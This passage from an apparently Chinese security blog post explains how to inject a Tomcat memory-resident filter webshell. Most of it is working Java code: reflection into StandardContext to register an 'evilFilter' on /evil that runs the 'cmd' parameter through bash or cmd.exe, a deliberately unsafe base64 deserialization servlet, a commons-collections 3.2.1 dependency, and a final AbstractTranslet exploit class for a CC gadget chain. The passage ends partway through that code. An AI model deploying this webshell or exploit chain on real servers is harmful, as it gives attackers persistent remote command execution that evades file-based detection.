applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 实例化evilFilter  </span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">evilFilter</span>();  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterDef  </span></span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">            filterDef.setFilter(filter);  </span><br><span class="line">            filterDef.setFilterName(filter.getClass().getName());  </span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());  </span><br><span class="line">            stdctx.addFilterDef(filterDef);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterMap  </span></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">            filterMap.setFilterName(filter.getClass().getName());  </span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/evil&quot;</span>);  </span><br><span class="line">            filterMap.addServletName(<span class="string">&quot;&quot;</span>);  </span><br><span class="line">            stdctx.addFilterMap(filterMap);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 实例化ApplicationFilterConfig  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">filterConfigClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);  </span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> filterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);  </span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(stdctx, filterDef);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterConfig  </span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> stdctx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">            filterConfigsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            Map&lt;String,ApplicationFilterConfig&gt; filterConfigs = (HashMap) filterConfigsField.get(stdctx);  </span><br><span class="line">            filterConfigs.put(filter.getClass().getName(), filterConfig);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">            Filter.<span class="built_in">super</span>.init(filterConfig);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">commmand</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(commmand);  </span><br><span class="line">                response.getWriter().println(output);  </span><br><span class="line">                System.out.println(output);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line"><span class="comment">//            chain.doFilter(request, response);  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">            Filter.<span class="built_in">super</span>.destroy();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功打入内存马<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729212118.png" alt="image.png"></p>
<p>这里是直接写了个Servlet来写入内存马的, 我们也可以结合反序列化<br>先写一个反序列化入口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/unser&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserialServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span>  IOException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">paylod</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;payload&quot;</span>);  </span><br><span class="line">        System.out.println(paylod);  </span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(paylod);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            obj = ois.readObject();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">        ois.close();  </span><br><span class="line">  </span><br><span class="line">        response.getWriter().println(obj.toString());  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>引入cc依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h5><p>最终内存马, 配合cc链加载两次此类即可写入内存马</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 获取standardContext  </span></span><br><span class="line">            <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">            <span class="keyword">if</span> (requestFacade != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">                <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 实例化evilFilter  </span></span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">filterShell</span>();  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterDef  </span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">                filterDef.setFilter(filter);  </span><br><span class="line">                filterDef.setFilterName(filter.getClass().getName());  </span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());  </span><br><span class="line">                stdctx.addFilterDef(filterDef);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterMap  </span></span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">                filterMap.setFilterName(filter.getClass().getName());  </span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/evil&quot;</span>);  </span><br><span class="line">                filterMap.addServletName(<span class="string">&quot;&quot;</span>);  </span><br><span class="line">                stdctx.addFilterMap(filterMap);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 实例化ApplicationFilterConfig  </span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">filterConfigClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);  </span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> filterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);  </span><br><span class="line">                constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(stdctx, filterDef);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterConfig  </span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> stdctx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">                filterConfigsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                Map&lt;String,ApplicationFilterConfig&gt; filterConfigs = (HashMap) filterConfigsField.get(stdctx);  </span><br><span class="line">                filterConfigs.put(filter.getClass().getName(), filterConfig);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + e.getMessage());  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;evil!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  